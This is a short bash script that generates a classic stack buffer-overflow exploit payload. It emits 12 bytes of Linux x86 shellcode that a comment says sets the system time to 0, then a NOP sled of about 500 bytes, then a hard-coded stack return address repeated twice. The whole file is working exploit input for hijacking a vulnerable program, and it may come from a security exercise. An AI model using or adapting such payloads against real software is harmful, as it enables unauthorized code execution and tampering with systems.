#!/bin/bash

#http://shell-storm.org/shellcode/files/shellcode-213.php
#12 bytes
#set system time to 0

echo -ne "\x6a\x19\x58\x99\x52\x89\xe3\xcd\x80\x40\xcd\x80"

for i in $(seq 13 508)
do
   echo -ne "\x90"
done

for i in 1 2
do
    echo -ne "\x1c\xd4\xff\xff"
done